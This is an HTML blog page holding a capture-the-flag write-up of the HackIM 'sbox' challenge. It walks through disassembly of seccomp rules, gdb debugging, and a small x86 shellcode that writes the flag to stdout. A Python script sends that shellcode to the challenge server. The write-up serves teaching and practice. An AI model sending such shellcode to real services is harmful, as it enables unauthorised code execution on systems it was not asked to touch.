@@ -1,0 +1,487 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>HackIM CTF: Sbox - staring into /dev/null</title>
+  <meta name="author" content="barrebas">
+
+  
+  <meta name="description" content="Quirky little challenge, this sbox. We&rsquo;re actually given the keys to the kingdom right away! Again, this was a one-two with superkojiman, who &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">staring into /dev/null</a></h1>
+  
+    <h2>barrebas</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:barrebas.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">HackIM CTF: Sbox</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T22:52:27+01:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:52 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Quirky little challenge, this <code>sbox</code>. We&rsquo;re actually given the keys to the kingdom right away!</p>
+
+<!-- more -->
+
+
+<p>Again, this was a one-two with superkojiman, who did the initial reversing! The program needs <code>libseccomp</code> to run. I had to install <code>libseccomp1</code> on my Ubuntu VM and symlink <code>libseccomp.so.2</code> to it to make the binary start. <a href="http://sourceforge.net/projects/libseccomp/">libseccomp</a> does syscall filtering. In this case, whatever is added to its internal list is ok, other syscalls are caught and the program exits with SIGSYS.</p>
+
+<p>The syscalls that are whitelisted can be found by looking for <code>seccomp_rule_add</code> calls:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> 80488dc: c7 44 24 0c 00 00 00   mov    DWORD PTR [esp+0xc],0x0
+</span><span class='line'> 80488e3: 00 
+</span><span class='line'> 80488e4: c7 44 24 08 03 00 00    mov    DWORD PTR [esp+0x8],0x3  ; syscall read
+</span><span class='line'> 80488eb: 00 
+</span><span class='line'> 80488ec: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
+</span><span class='line'> 80488f3: 7f 
+</span><span class='line'> 80488f4: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
+</span><span class='line'> 80488f8: 89 04 24                mov    DWORD PTR [esp],eax
+</span><span class='line'> 80488fb: e8 b0 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
+</span><span class='line'> 8048900: 89 44 24 38             mov    DWORD PTR [esp+0x38],eax
+</span><span class='line'> 8048904: 83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
+</span><span class='line'> 8048909: 79 05                   jns    8048910 &lt;main+0x191&gt;
+</span><span class='line'> 804890b: e9 d9 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
+</span><span class='line'> 8048910: c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
+</span><span class='line'> 8048917: 00 
+</span><span class='line'> 8048918: c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4  ; syscall write
+</span><span class='line'> 804891f: 00 
+</span><span class='line'> 8048920: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
+</span><span class='line'> 8048927: 7f 
+</span><span class='line'> 8048928: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
+</span><span class='line'> 804892c: 89 04 24                mov    DWORD PTR [esp],eax
+</span><span class='line'> 804892f: e8 7c fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;
+</span><span class='line'> 8048934: 89 44 24 38             mov    DWORD PTR [esp+0x38],eax
+</span><span class='line'> 8048938: 83 7c 24 38 00          cmp    DWORD PTR [esp+0x38],0x0
+</span><span class='line'> 804893d: 79 05                   jns    8048944 &lt;main+0x1c5&gt;
+</span><span class='line'> 804893f: e9 a5 00 00 00          jmp    80489e9 &lt;main+0x26a&gt;
+</span><span class='line'> 8048944: c7 44 24 0c 00 00 00    mov    DWORD PTR [esp+0xc],0x0
+</span><span class='line'> 804894b: 00 
+</span><span class='line'> 804894c: c7 44 24 08 01 00 00    mov    DWORD PTR [esp+0x8],0x1  ; syscall exit
+</span><span class='line'> 8048953: 00 
+</span><span class='line'> 8048954: c7 44 24 04 00 00 ff    mov    DWORD PTR [esp+0x4],0x7fff0000
+</span><span class='line'> 804895b: 7f 
+</span><span class='line'> 804895c: 8b 44 24 34             mov    eax,DWORD PTR [esp+0x34]
+</span><span class='line'> 8048960: 89 04 24                mov    DWORD PTR [esp],eax
+</span><span class='line'> 8048963: e8 48 fc ff ff          call   80485b0 &lt;seccomp_rule_add@plt&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So that&rsquo;s not a whole lot to work with. We can only read, write and exit. No <code>execve</code> or open/read/write for us!</p>
+
+<h2>Diving deeper</h2>
+
+<p>Luckily, when run, the binary does all the heavy lifting for us. It reads the flag and stores it on the heap. It then waits for input, storing that also on the heap and then proceeds to run whatever is entered:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>   0x80489d6 &lt;main+599&gt;:    call   0x80485a0 &lt;read@plt&gt;
+</span><span class='line'>   0x80489db &lt;main+604&gt;:    mov    eax,DWORD PTR [esp+0x2c]
+</span><span class='line'>   0x80489df &lt;main+608&gt;:    mov    DWORD PTR [esp+0x3c],eax
+</span><span class='line'>   0x80489e3 &lt;main+612&gt;:    mov    eax,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x80489e7 &lt;main+616&gt;:    call   eax</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This allows us to supply our own shellcode without even having to exploit a vulnerability. There were some annoying things that prevented me from debugging the binary locally, so I hex-edited the binary to make the calls to <code>signal()</code> and <code>alarm()</code> do nothing (edit the <code>plt</code> section for those calls &amp; make the first byte <code>0xc3</code> -> <code>RET</code>).</p>
+
+<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">5555</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">raw_input</span><span class="p">()</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\xcc</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>gdb -pid <span class="sb">`</span>pgrep sbox<span class="sb">`</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>0xb77c6002 in ?? <span class="o">()</span>
+</span><span class='line'>gdb-peda<span class="nv">$ </span>i r
+</span><span class='line'>eax            0xb77c6000    0xb77c6000
+</span><span class='line'>ecx            0xb77c6000    0xb77c6000
+</span><span class='line'>edx            0x2000    0x2000
+</span><span class='line'>ebx            0xb77a5ff4    0xb77a5ff4
+</span><span class='line'>esp            0xbf9eff0c    0xbf9eff0c
+</span><span class='line'>ebp            0xbf9eff58    0xbf9eff58
+</span><span class='line'>esi            0x0    0x0
+</span><span class='line'>edi            0x0    0x0
+</span><span class='line'>eip            0xb77c6002    0xb77c6002
+</span><span class='line'>eflags         0x207    <span class="o">[</span> CF PF IF <span class="o">]</span>
+</span><span class='line'>cs             0x73    0x73
+</span><span class='line'>ss             0x7b    0x7b
+</span><span class='line'>ds             0x7b    0x7b
+</span><span class='line'>es             0x7b    0x7b
+</span><span class='line'>fs             0x0    0x0
+</span><span class='line'>gs             0x33    0x33
+</span><span class='line'>gdb-peda<span class="nv">$ </span>find <span class="s2">&quot;FLAG&quot;</span>
+</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;FLAG&#39;</span> in: None ranges
+</span><span class='line'>Found <span class="m">2</span> results, display max <span class="m">2</span> items:
+</span><span class='line'>    mapped : 0xb77c8000 <span class="o">(</span><span class="s2">&quot;FLAG\n&quot;</span><span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bits 32
+</span><span class='line'>
+</span><span class='line'>push 0x20     <span class="c"># </span>
+</span><span class='line'>pop ebx       <span class="c"># pop 0x20 in ebx</span>
+</span><span class='line'>shl ebx, <span class="m">8</span>    <span class="c"># ebx is now 0x2000</span>
+</span><span class='line'>              <span class="c"># adjust ecx so that it points to flag in memory</span>
+</span><span class='line'>add ecx, ebx  <span class="c"># ecx = buffer</span>
+</span><span class='line'>xor ebx, ebx  <span class="c"># ebx = fd</span>
+</span><span class='line'>inc ebx       <span class="c"># STDOUT; STDERR also works</span>
+</span><span class='line'>xor edx, edx  <span class="c"># edx = count</span>
+</span><span class='line'>mov dl, 0xff  <span class="c"># write out 255 bytes</span>
+</span><span class='line'>push <span class="m">4</span>        <span class="c"># eax = syscall</span>
+</span><span class='line'>pop eax       <span class="c"># eax = write</span>
+</span><span class='line'>int 0x80      <span class="c"># get flag!</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nasm -f bin ./shellcode.asm
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;shellcode&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The result:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python sploit.py
+</span><span class='line'>d3sp3r4t3_sh3llc0d3
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-11T22:52:27+01:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:52 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exploitation/'>exploitation</a>, <a class='category' href='/blog/categories/hackim/'>hackim</a>, <a class='category' href='/blog/categories/nullcon/'>nullcon</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/11/hackim-ctf-mentalnote/" title="Previous Post: HackIM CTF - MentalNote">&laquo; HackIM CTF - MentalNote</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/01/11/hackim-ctf-sbox/">HackIM CTF: Sbox</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/11/hackim-ctf-mentalnote/">HackIM CTF - MentalNote</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/11/hackim-ctf-mixme-writeup/">HackIM CTF: Mixme Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/03/weekly-roundup-2015-number-1/">Weekly Roundup 2015 #1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/29/31c3-ctf-cfy/">31C3 CTF - Cfy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/';
+        var disqus_url = 'http://barrebas.github.io/blog/2015/01/11/hackim-ctf-sbox/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
